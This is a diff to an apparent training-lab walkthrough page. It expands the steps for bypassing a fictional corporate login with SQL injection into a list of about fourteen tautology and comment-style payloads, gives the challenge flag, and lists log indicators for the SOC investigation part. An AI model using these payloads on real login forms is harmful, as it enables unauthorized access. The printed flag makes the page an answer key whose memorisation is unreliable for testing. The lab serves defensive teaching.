@@ -32,15 +32,26 @@
   <h2>Part 1: How to Perform the Lab</h2>
   
   <div class="walkthrough-step">
-    <strong>Attack 1: SQL Injection (Login Bypass)</strong><br>
-    1. In the top navigation, ensure you are in the <strong>🌐 Web Application (portal.aegis-corp.com)</strong> tab.<br>
-    2. Click <strong>"Sign In"</strong> in the top navigation bar to open the corporate Single Sign-On (SSO) login form (<code>/auth/login</code>).<br>
-    3. Inject a SQL boolean tautology or comment delimiter into either the Username or Password input field:
-       <br><code>admin' --</code> &nbsp; <em>(or enter <code>' OR '1'='1</code> in password)</em><br>
-    4. Click <strong>Sign In</strong>. The vulnerable backend SQL query evaluates to <code>TRUE</code>, authenticating you as Administrator and returning an <strong>HTTP 302</strong> redirect.<br>
-    5. The application navigates to the <strong>🛡️ Admin Home Page & System Control Center</strong>. Look inside the green <strong>Administrative Secret Vault</strong> card to retrieve the challenge flag:
-       <br><code>BLITZ{5ql1_byp455_4dm1n_h0m3_7d91a}</code><br>
-    6. Switch to the <strong>🛡️ SOC SIEM Log Monitor</strong> tab and filter by <code>uri:*login*</code> or <code>rule:RULE-SEC-002</code> to inspect the generated <code>POST /auth/login</code> request.
+    <strong>Attack 1: SQL Injection (Login Bypass & Forensic IoC Analysis)</strong><br>
+    <strong>Step A:</strong> In the top navigation, ensure you are in the <strong>🌐 Web Application (portal.aegis-corp.com)</strong> tab.<br>
+    <strong>Step B:</strong> Click <strong>"Sign In"</strong> in the top navigation bar to open the corporate Single Sign-On (SSO) login form (<code>/auth/login</code>).<br>
+    <strong>Step C:</strong> Inject any SQL injection authentication bypass payload into either Username or Password:<br>
+    <div style="background: #f1f5f9; padding: 6px 10px; border-radius: 4px; margin: 6px 0; font-family: Consolas, monospace; font-size: 9.5pt;">
+      <code>admin' --</code> &nbsp;|&nbsp; <code>admin' #</code> &nbsp;|&nbsp; <code>admin'/*</code> &nbsp;|&nbsp; <code>admin' or '1'='1</code> &nbsp;|&nbsp; <code>admin' or '1'='1'--</code><br>
+      <code>admin' or 1=1</code> &nbsp;|&nbsp; <code>admin' or 1=1--</code> &nbsp;|&nbsp; <code>admin') or ('1'='1</code> &nbsp;|&nbsp; <code>admin') or '1'='1--</code><br>
+      <code>1' or '1' = '1</code> &nbsp;|&nbsp; <code>or 1=1</code> &nbsp;|&nbsp; <code>or 1=1--</code> &nbsp;|&nbsp; <code>or 1=1#</code> &nbsp;|&nbsp; <code>or 1=1/*</code>
+    </div>
+    <strong>Step D:</strong> Click <strong>Sign In</strong>. The backend query evaluates to <code>TRUE</code>, authenticating you as Administrator and returning an <strong>HTTP 302</strong> redirect.<br>
+    <strong>Step E:</strong> Retrieve Flag #1 from the green <strong>Administrative Secret Vault</strong> card on the <strong>Admin Home Page</strong>:<br>
+    <code style="font-size: 11pt; color: #047857;">BLITZ{5ql1_byp455_4dm1n_h0m3_7d91a}</code><br><br>
+    <strong>Step F (Find IoC in Web Logs):</strong> Switch to the <strong>🛡️ SOC SIEM Log Monitor</strong> tab. Locate the <code>POST /auth/login</code> entry with status <code>302</code> and inspect the forensic IoCs:<br>
+    &bull; <strong>Request URI:</strong> <code>/auth/login</code><br>
+    &bull; <strong>HTTP Method:</strong> <code>POST</code><br>
+    &bull; <strong>Response Status Code:</strong> <code>302 Found</code> (Authentication Redirect)<br>
+    &bull; <strong>Payload Location:</strong> <code>Request Body</code> (e.g., <code>username=admin' --&password=...</code>)<br>
+    &bull; <strong>SIEM Detection Rule:</strong> <code>RULE-SEC-002</code> (SQL Injection - Authentication Bypass / Tautology Probe)<br>
+    &bull; <strong>Client IP:</strong> <code>203.0.113.195</code><br>
+    <strong>Step G:</strong> Paste these values into <strong>Question 1, Question 2, and Question 3</strong> in the questionnaire below.
   </div>
 
   <div class="walkthrough-step">
